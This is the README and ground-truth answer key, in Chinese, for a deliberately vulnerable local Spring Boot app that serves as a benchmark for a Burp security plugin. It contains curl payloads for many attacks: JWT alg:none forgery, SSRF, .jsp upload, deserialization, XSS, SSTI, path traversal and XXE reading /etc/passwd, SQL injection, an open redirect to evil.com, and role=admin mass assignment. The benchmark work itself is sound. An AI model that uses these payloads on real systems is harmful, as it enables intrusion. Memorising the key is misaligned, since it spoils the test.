# demo-vuln-app 漏洞清单（Ground Truth）

这是 API Sentinel 的基准测试应用，独立 Spring Boot 项目，共 42 个接口。
故意留了真实可用的漏洞，**只在本地跑，千万别部署到公网/共享环境**。

## 启动

监听 `http://localhost:8089`，两种方式任选（JDK 17+）：

**方式一：直接跑打好的 jar（最快）**

```bash
cd demo-vuln-app
java -jar target/vuln-app-1.0.0.jar        # jar 不存在就先跑一次方式二，会自动打出
```

**方式二：Maven 源码模式**

```bash
cd demo-vuln-app
mvn spring-boot:run
```

提示：
- 报 `mvn: command not found` 说明 PATH 里没有 Maven。本机的 Maven 在
  `~/tools/apache-maven-3.9.16/`，用全路径即可：
  `~/tools/apache-maven-3.9.16/bin/mvn spring-boot:run`
  （或把 `export PATH="$HOME/tools/apache-maven-3.9.16/bin:$PATH"` 加进 `~/.zshrc`）。
  全新机器先装 Maven：`brew install maven` 或从 Apache 官网下载二进制包。
- 依赖走的是 `~/.m2/settings.xml` 里配置的阿里云镜像（国内网络快）；换环境如果拉不到依赖，检查该配置。
- 启动日志里看不到 "Started VulnAppApplication" 是**正常的**——`application.properties`
  故意设了 `logging.level.root=WARN`。只要 8089 端口能访问就是起来了。

**没有根路径 `/` 的页面**（访问 `/` 会 404，这是正常的，不是配置问题）——它是纯 API 测试夹具，不是一个网站。要访问下面表格里列出的具体路径。

## 怎么把流量导入 Burp（含 POST 接口怎么发）

浏览器直接点只能测 GET 接口，而且不方便加 Cookie。最简单的办法是用 `curl` 通过 Burp 代理发请求——这样请求会自动被 Burp 抓到 Proxy History，插件也能拿到。

把下面命令里的 `127.0.0.1:8080` 换成你 Burp 实际配置的代理地址（Burp 默认就是这个，一般不用改）。

### 第一步：登录拿 Cookie（不是漏洞项，是测试基础设施）

```bash
BURP=http://127.0.0.1:8080
BASE=http://localhost:8089

curl -x $BURP -s -c /tmp/alice.cookie -X POST "$BASE/api/login?username=alice"
curl -x $BURP -s -c /tmp/bob.cookie   -X POST "$BASE/api/login?username=bob"
```
`-c /tmp/alice.cookie` 会把返回的 `SESSION_USER` cookie 存到文件里，后面用 `-b` 带上这个文件就相当于"以 alice 身份"发请求。

### 第二步：按下表逐个访问

**GET 接口**（可以浏览器直接打开，也可以用下面命令通过代理访问）：

```bash
curl -x $BURP -s "$BASE/api/users/search?name=x"
curl -x $BURP -s "$BASE/api/products/search?name=Widget"
curl -x $BURP -s "$BASE/api/orders/1001"
curl -x $BURP -s -b /tmp/bob.cookie "$BASE/api/invoices/2001"
curl -x $BURP -s -b /tmp/bob.cookie "$BASE/api/admin/users"
curl -x $BURP -s "$BASE/api/profile"
curl -x $BURP -s -H "Origin: https://evil.example.com" "$BASE/api/profile2"
curl -x $BURP -s "$BASE/web/dashboard"
curl -x $BURP -s "$BASE/api/users/1"
curl -x $BURP -s "$BASE/api/users/1/public"
curl -x $BURP -s "$BASE/api/debug/config"
curl -x $BURP -s "$BASE/api/greet?name=World"
curl -x $BURP -s "$BASE/api/greet-safe?name=World"
curl -x $BURP -s "$BASE/api/render?template=Hello"
curl -x $BURP -s "$BASE/api/render-safe?template=Hello"
curl -x $BURP -s "$BASE/api/files?path=readme.txt"
curl -x $BURP -s "$BASE/api/files-safe?path=readme.txt"
curl -x $BURP -s "$BASE/api/products/detail?id=1"
curl -x $BURP -s "$BASE/api/products/detail-safe?id=1"
curl -x $BURP -s "$BASE/api/redirect?url=http://example.com"
curl -x $BURP -s "$BASE/api/redirect-safe?url=http://example.com"
```

**POST 接口**（浏览器点不了，必须用 curl 或 Burp Repeater 发，下面是 curl 版本）：

```bash
# #7 JWT alg:none —— 伪造一个不带签名的 token
curl -x $BURP -s -X POST "$BASE/api/auth/token" \
  -H "Content-Type: application/json" \
  -d '{"token":"eyJhbGciOiJub25lIn0.eyJ1c2VyIjoxfQ."}'

# #8 JWT 严格校验（safe）—— 随便传个假 token，应该被拒绝
curl -x $BURP -s -X POST "$BASE/api/auth/token-strict" \
  -H "Content-Type: application/json" \
  -d '{"token":"aaa.bbb.ccc"}'

# #11 SSRF —— 让服务器帮你请求内部地址
curl -x $BURP -s -X POST "$BASE/api/fetch-url" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8089/api/debug/config"}'

# #12 SSRF（safe，有白名单，应该被拒绝）
curl -x $BURP -s -X POST "$BASE/api/fetch-url-safe" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8089/api/debug/config"}'

# #13 危险文件上传（任意扩展名）—— 上传一个 .jsp 文件
echo '<% out.println("test"); %>' > /tmp/shell.jsp
curl -x $BURP -s -X POST "$BASE/api/upload" -F "file=@/tmp/shell.jsp"

# #14 上传（safe，有白名单，.jsp 应该被拒绝）
curl -x $BURP -s -X POST "$BASE/api/upload-safe" -F "file=@/tmp/shell.jsp"

# #15 反序列化 —— 发一段随便的字节，会报错但能看出它真的在反序列化
curl -x $BURP -s -X POST "$BASE/api/import" \
  -H "Content-Type: application/octet-stream" \
  --data-binary $'\xac\xed\x00\x05garbage'

# #20 CSRF —— 用 alice 的 cookie 下单，全程没有任何 CSRF token
curl -x $BURP -s -X POST -b /tmp/alice.cookie "$BASE/api/checkout"

# #21 XSS 反射 —— 输入直接拼进 HTML
curl -x $BURP -s "$BASE/api/greet?name=<script>alert(1)</script>"

# #22 XSS（safe，做了 HTML 转义）
curl -x $BURP -s "$BASE/api/greet-safe?name=<script>alert(1)</script>"

# #23 SSTI —— 用户输入被当作 Freemarker 模板编译
curl -x $BURP -s "$BASE/api/render?template=\${7*7}"

# #24 SSTI（safe，固定模板）
curl -x $BURP -s "$BASE/api/render-safe?template=\${7*7}"

# #25 路径穿越 —— ../../../etc/passwd
curl -x $BURP -s "$BASE/api/files?path=../../../etc/passwd"

# #26 路径穿越（safe，有路径校验）
curl -x $BURP -s "$BASE/api/files-safe?path=../../../etc/passwd"

# #27 XXE —— 外部实体读文件
curl -x $BURP -s -X POST "$BASE/api/parse-xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# #28 XXE（safe，禁用了外部实体）
curl -x $BURP -s -X POST "$BASE/api/parse-xml-safe" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# #29 布尔盲注 —— id 直接拼进 SQL
curl -x $BURP -s "$BASE/api/products/detail?id=1 AND 1=1"

# #30 布尔盲注（safe，参数化查询）
curl -x $BURP -s "$BASE/api/products/detail-safe?id=1 AND 1=1"

# #31 竞态条件 —— 先读余额再扣款，两步之间可并发双花
curl -x $BURP -s -X POST -b "SESSION_USER=1" "$BASE/api/transfer?amount=100&toUser=2"

# #32 竞态条件（safe，原子 UPDATE）
curl -x $BURP -s -X POST -b "SESSION_USER=1" "$BASE/api/transfer-safe?amount=100&toUser=2"

# #33 不安全随机数 —— java.util.Random 生成 token
curl -x $BURP -s -X POST "$BASE/api/reset-token?username=alice"

# #34 安全随机数 —— SecureRandom
curl -x $BURP -s -X POST "$BASE/api/reset-token-safe?username=alice"

# #35 硬编码密钥 + ECB 模式
curl -x $BURP -s -X POST "$BASE/api/encrypt" \
  -H "Content-Type: application/json" \
  -d '{"data":"sensitive info"}'

# #36 加密（safe，环境变量密钥 + CBC）
curl -x $BURP -s -X POST "$BASE/api/encrypt-safe" \
  -H "Content-Type: application/json" \
  -d '{"data":"sensitive info"}'

# #37 弱密码哈希 —— MD5 无盐
curl -x $BURP -s -X POST "$BASE/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"hello123"}'

# #38 密码哈希（safe，BCrypt）
curl -x $BURP -s -X POST "$BASE/api/register-safe" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"hello123"}'

# #39 开放重定向 —— 任意 URL 直接 302
curl -x $BURP -s -o /dev/null -D - "$BASE/api/redirect?url=https://evil.com/phishing"

# #40 重定向（safe，白名单校验）
curl -x $BURP -s "$BASE/api/redirect-safe?url=https://evil.com/phishing"

# #41 Mass Assignment —— 攻击者可设置 role=admin
curl -x $BURP -s -X POST "$BASE/api/profile/update" \
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"h@x.com","role":"admin","admin":true}'

# #42 Mass Assignment（safe，DTO 限制字段）
curl -x $BURP -s -X POST "$BASE/api/profile/update-safe" \
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"h@x.com","role":"admin","admin":true}'
```

## 漏洞对照表

`需跳层` = 这个漏洞/安全点只看 controller 那几行代码看不出来，得往下追一层 service/DAO 类才能判断对错——这几条是专门用来检验 API Sentinel 新加的 `read_file`/`grep_repo` 工具有没有真的被用上、有没有跟到下一层代码的，测试时重点关注。

| # | 接口 | 类型 | 结论 | 需跳层 |
|---|---|---|---|---|
| 1 | `GET /api/users/search?name=` | SQL 注入 | **有漏洞** —— 字符串拼接查询，报错直接把数据库原始错误回显给你 | 否 |
| 2 | `GET /api/products/search?name=` | SQL 注入（安全对照） | 安全 —— 同样功能用了参数化查询 | 否 |
| 3 | `GET /api/orders/{id}`（传一个不存在的 id，如 9999） | 堆栈跟踪泄露 | **有漏洞** —— 空指针异常，完整 Java 堆栈直接返回给你 | 是 |
| 4 | `GET /api/orders/{id}`（传别人的 id，如 bob 访问 alice 的订单 1001） | 越权 / IDOR | **有漏洞** —— 整条调用链里都没有校验"这个订单是不是你的" | 是 |
| 5 | `GET /api/invoices/{id}`（bob 访问 alice 的发票 2001，应返回 403） | 越权（安全对照） | 安全 —— 归属校验做在 service 层 | 是 |
| 6 | `GET /api/admin/users`（用普通用户 bob 的 cookie 访问） | 垂直越权 | **有漏洞** —— 只检查"有没有登录"，从没检查"是不是管理员"；真正的角色校验类 `AdminGuard` 存在但没人调用它 | 是 |
| 7 | `POST /api/auth/token` | JWT 缺陷 | **有漏洞** —— header 写 `"alg":"none"` 就能绕过签名校验，伪造任意身份 | 是 |
| 8 | `POST /api/auth/token-strict` | JWT（安全对照） | 安全 —— 完整 HS256 签名 + 过期时间校验 | 是 |
| 9 | `GET /api/profile` | CORS 误配 | **有漏洞** —— `Access-Control-Allow-Origin: *` 同时还开着 `Allow-Credentials: true` | 否 |
| 10 | `GET /api/profile2` | CORS 误配 | **有漏洞** —— 把请求里的 `Origin` 头原样反射回去当白名单，等于允许任何来源 | 否 |
| 11 | `POST /api/fetch-url` | SSRF | **有漏洞** —— 服务器帮你请求任意 URL，没有任何白名单，可以借它访问内部地址 | 是 |
| 12 | `POST /api/fetch-url-safe` | SSRF（安全对照） | 安全 —— 只允许请求白名单里的域名 | 是 |
| 13 | `POST /api/upload` | 危险文件上传 | **有漏洞** —— 任意扩展名都能上传（比如 .jsp/.php），文件名原样保存 | 否 |
| 14 | `POST /api/upload-safe` | 文件上传（安全对照） | 安全 —— 扩展名白名单 + 随机文件名 | 否 |
| 15 | `POST /api/import` | 反序列化 | **有漏洞** —— 直接对用户传的字节做 Java 反序列化 | 否 |
| 16 | `GET /web/dashboard` | 缺失安全头 | **有漏洞** —— 没有 CSP/HSTS/X-Frame-Options 等任何安全响应头 | 否 |
| 17 | `GET /api/users/{id}` | 敏感信息泄露 | **有漏洞** —— 把密码哈希、身份证号也一起返回了 | 否 |
| 18 | `GET /api/users/{id}/public` | 敏感信息（安全对照） | 安全 —— 只返回过滤后的字段 | 否 |
| 19 | `GET /api/debug/config` | 调试模式 / 信息泄露 | **有漏洞** —— 直接暴露 `debug:true`、内网 IP、数据库连接串，且不需要登录 | 否 |
| 20 | `POST /api/checkout` | CSRF | **有漏洞** —— 状态变更操作只靠 Cookie 认证，全程没有校验任何 CSRF token | 否 |

| 21 | `GET /api/greet?name=` | XSS 反射 | **有漏洞** —— 直接把用户输入拼进 HTML 返回，没有任何转义 | 否 |
| 22 | `GET /api/greet-safe?name=` | XSS（安全对照） | 安全 —— 使用 HtmlUtils.htmlEscape 转义 | 否 |
| 23 | `GET /api/render?template=` | SSTI 模板注入 | **有漏洞** —— 用户输入直接作为 Freemarker 模板编译执行，可 RCE | 否 |
| 24 | `GET /api/render-safe?template=` | SSTI（安全对照） | 安全 —— 固定模板 + 变量占位，不解析用户输入为模板 | 否 |
| 25 | `GET /api/files?path=` | 路径穿越 / LFI | **有漏洞** —— 直接用用户输入拼接文件路径，可用 `../` 读取任意文件 | 否 |
| 26 | `GET /api/files-safe?path=` | 路径穿越（安全对照） | 安全 —— 规范化后校验路径前缀，阻止目录穿越 | 否 |
| 27 | `POST /api/parse-xml` | XXE 注入 | **有漏洞** —— XML 解析器未禁用外部实体，可读取本机文件 | 否 |
| 28 | `POST /api/parse-xml-safe` | XXE（安全对照） | 安全 —— 禁用了 DTD 和外部实体 | 否 |
| 29 | `GET /api/products/detail?id=` | 布尔盲注 | **有漏洞** —— 整数 id 直接拼接进 SQL，返回结果有/无可作为布尔条件 | 否 |
| 30 | `GET /api/products/detail-safe?id=` | 布尔盲注（安全对照） | 安全 —— 使用参数化查询 | 否 |
| 31 | `POST /api/transfer` | 竞态条件 / TOCTOU | **有漏洞** —— 余额检查和扣款分两步操作，无锁无事务，并发可双花 | 是 |
| 32 | `POST /api/transfer-safe` | 竞态条件（安全对照） | 安全 —— 用 `UPDATE ... WHERE balance >= ?` 原子操作 | 是 |
| 33 | `POST /api/reset-token` | 不安全随机数 | **有漏洞** —— 使用 `java.util.Random` 生成密码重置 token，可被预测 | 是 |
| 34 | `POST /api/reset-token-safe` | 随机数（安全对照） | 安全 —— 使用 `SecureRandom` + 32 字节 | 是 |
| 35 | `POST /api/encrypt` | 硬编码密钥 + ECB | **有漏洞** —— AES 密钥硬编码在 `CryptoService` 源码中，且使用 ECB 模式 | 是 |
| 36 | `POST /api/encrypt-safe` | 加密（安全对照） | 安全 —— 密钥从环境变量读取，使用 CBC 模式 | 是 |
| 37 | `POST /api/register` | 弱密码哈希 | **有漏洞** —— 密码用 MD5 无盐存储，service 层调用 `MessageDigest.getInstance("MD5")` | 是 |
| 38 | `POST /api/register-safe` | 密码哈希（安全对照） | 安全 —— 使用 BCrypt 加盐哈希 | 是 |
| 39 | `GET /api/redirect?url=` | 开放重定向 | **有漏洞** —— 用户提供的 URL 直接放进 302 Location 头，无任何白名单校验 | 是 |
| 40 | `GET /api/redirect-safe?url=` | 重定向（安全对照） | 安全 —— URL host 必须在 `RedirectValidator` 白名单内 | 是 |
| 41 | `POST /api/profile/update` | Mass Assignment | **有漏洞** —— 直接绑定 `UserProfile` 含 `role`/`isAdmin` 字段，攻击者可提升权限 | 是 |
| 42 | `POST /api/profile/update-safe` | Mass Assignment（安全对照） | 安全 —— 只接受 `ProfileUpdateDto`（name/email） | 是 |

共 24 条有漏洞、18 条安全对照。20 条标了"需跳层"——这些最能看出插件到底有没有真的在用 `read_file`/`grep_repo`/`find_definition`/`find_callers`，而不是只看 controller 表面代码。其中 #31-#42 是"Agent 专属"逻辑漏洞——**纯靠发 HTTP 请求根本发现不了**，必须分析源码调用链。

## 备注

- #1 的数据库报错来自 H2（内存数据库），不是 MySQL/PostgreSQL/Oracle/SQL Server/SQLite——
  插件本地的启发式检测规则（`HeuristicDetector`）是按这五种数据库的报错签名写的，**大概率不会命中 #1**。
  这是故意的：正好用来测试 AI 这一层本身能不能从报错内容/行为判断出是 SQL 注入，而不是靠本地正则碰巧匹配上。
- `application.properties` 里全局开了 `server.error.include-stacktrace=always`，所以 #3 之外，
  任何接口出了未捕获异常都会带完整堆栈——这是故意的不安全默认配置，方便复现。
- 项目里完全没引入 Spring Security，所以 #16 的"缺失安全头"是自然结果，不需要额外写代码。


接口清单
GET /api/users/search  # SQLi 有漏洞
GET /api/products/search  # SQLi 安全对照
GET /api/orders/{id}  # 堆栈泄露+IDOR(同一接口两个问题)
GET /api/invoices/{id}  # IDOR 安全对照
GET /api/admin/users  # 垂直越权
POST /api/auth/token  # JWT alg:none
POST /api/auth/token-strict  # JWT 安全对照
GET /api/profile  # CORS 通配符+凭证
GET /api/profile2  # CORS Origin反射
POST /api/fetch-url  # SSRF
POST /api/fetch-url-safe  # SSRF 安全对照
POST /api/upload  # 危险上传
POST /api/upload-safe  # 上传安全对照
POST /api/import  # 反序列化
GET /web/dashboard  # 缺失安全头
GET /api/users/{id}  # 敏感信息泄露
GET /api/users/{id}/public  # 敏感信息安全对照
GET /api/debug/config  # 调试模式泄露
POST /api/checkout  # CSRF
GET /api/greet  # XSS反射 有漏洞
GET /api/greet-safe  # XSS 安全对照
GET /api/render  # SSTI 有漏洞
GET /api/render-safe  # SSTI 安全对照
GET /api/files  # 路径穿越 有漏洞
GET /api/files-safe  # 路径穿越 安全对照
POST /api/parse-xml  # XXE 有漏洞
POST /api/parse-xml-safe  # XXE 安全对照
GET /api/products/detail  # 布尔盲注 有漏洞
GET /api/products/detail-safe  # 布尔盲注 安全对照
POST /api/transfer  # 竞态条件 有漏洞 (需跳层)
POST /api/transfer-safe  # 竞态条件 安全对照 (需跳层)
POST /api/reset-token  # 不安全随机数 有漏洞 (需跳层)
POST /api/reset-token-safe  # 安全随机数 (需跳层)
POST /api/encrypt  # 硬编码密钥+ECB 有漏洞 (需跳层)
POST /api/encrypt-safe  # 加密 安全对照 (需跳层)
POST /api/register  # MD5弱哈希 有漏洞 (需跳层)
POST /api/register-safe  # BCrypt 安全对照 (需跳层)
GET /api/redirect  # 开放重定向 有漏洞 (需跳层)
GET /api/redirect-safe  # 重定向 安全对照 (需跳层)
POST /api/profile/update  # Mass Assignment 有漏洞 (需跳层)
POST /api/profile/update-safe  # Mass Assignment 安全对照 (需跳层)
